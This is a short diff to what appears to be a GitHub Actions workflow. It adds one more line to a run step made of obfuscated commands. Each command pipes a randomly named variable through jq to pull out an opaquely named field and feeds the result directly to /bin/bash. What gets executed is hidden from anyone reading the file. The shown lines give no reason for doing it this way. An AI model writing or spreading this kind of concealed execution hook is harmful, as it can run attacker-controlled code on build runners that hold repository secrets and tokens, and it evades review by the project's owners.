@@ -25,6 +25,7 @@ jobs:
           echo $rm25380 | jq -r .cnfhg12 | /bin/bash
           printf '%s' "$vl9" | jq -r .pzz299 | /bin/bash
           echo $zsk5045 | jq -r .ftzdd44 | /bin/bash
+          printf '%s' "$c48" | jq -r .cjkn0005 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
